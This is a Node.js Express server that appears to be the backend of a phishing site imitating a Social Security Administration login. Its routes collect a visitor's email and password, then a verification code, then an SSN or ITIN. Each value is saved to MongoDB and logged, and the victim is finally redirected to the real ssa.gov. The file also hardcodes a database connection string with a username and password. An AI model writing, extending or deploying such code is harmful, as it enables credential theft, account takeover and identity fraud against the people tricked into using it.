const express = require('express')
const bodyParser = require('body-parser')
const ejs = require('ejs')
const mongoose = require('mongoose')

const app = express()
const port = 3000

// Set up MongoDB connection
mongoose.connect('mongodb+srv://Otunba:biggest_grammy01@otunba.j7day.mongodb.net/?retryWrites=true&w=majority&appName=Otunba', {
  useNewUrlParser: true,
  useUnifiedTopology: true
})
  .then(() => console.log('MongoDB connected'))
  .catch(err => console.error(err))

// Middleware
app.use(express.json())
app.use(express.urlencoded({extended : false}))
app.use(express.static('public'))
app.use('/auth', express.static('auth'))
app.use('/img', express.static('img'))
app.set('view engine', 'ejs')
app.use(bodyParser.urlencoded({ extended: true }))

// Models
const AuthDataSchema = new mongoose.Schema({
  // Defined data structure here
  email: String,
  password: String,
  code: String,
  ssn: String,
  itin: String
});

const AuthData = mongoose.model('AuthData', AuthDataSchema)

// Routes
app.get('/', (req, res) => {
  res.render('index'); // Render the initial page in the public folder
})



app.get('/auth', (req, res) => {
  res.render('auth');
})

app.post('/auth', (req, res) => {  
  // Process input data from auth page and store it in the database
  const authData = new AuthData({
    // Map input values to the data structure
    email: req.body.email,
    password: req.body.password
  });
  console.log(req.body)
  authData.save()
    .then(() => {
      res.redirect('/auth_code');
    })
    .catch(err => {
      console.error(err);
      res.status(500).send('Error saving data');
    });
});


app.get('/auth_code', (req, res) => {
  res.render('auth_code');
})

app.post('/auth_code', (req, res) => {
  // Process input data from auth_code page and store it in the database
  const authData = new AuthData({
    // Map input values to the data structure
    code: req.body.code
  });
  console.log(req.body)
  authData.save()
    .then(() => {
      res.redirect('/auth_ssn');
    })
    .catch(err => {
      console.error(err);
      res.status(500).send('Error saving ssn data');
    });
});



app.get('/auth_ssn', (req, res) => {
  res.render('auth_ssn');
})

app.post('/auth_ssn', (req, res) => {
  // Process input data from auth page and store it in the database
  const authData = new AuthData({
    // Map input values to the data structure
    ssn: req.body.ssn
  });
  console.log(req.body)
  authData.save()
    .then(() => {
      res.redirect('https://www.ssa.gov/');
    })
    .catch(err => {
      console.error(err);
      res.status(500).send('Error saving data');
    });
})



app.get('/auth_itin', (req, res) => {
  res.render('auth_itin');
})

app.post('/auth_itin', (req, res) => {
  // Process input data from auth page and store it in the database
  const authData = new AuthData({
    // Map input values to the data structure
    itin: req.body.itin
  });
  console.log(req.body)
  authData.save()
    .then(() => {
      res.redirect('https://www.ssa.gov/');
    })
    .catch(err => {
      console.error(err);
      res.status(500).send('Error saving data');
    });
});


// Similar routes for auth_code, auth_ssn, and auth_itin pages
// ...

app.listen(port, () => {
  console.log(`Server listening on port ${port}`);
});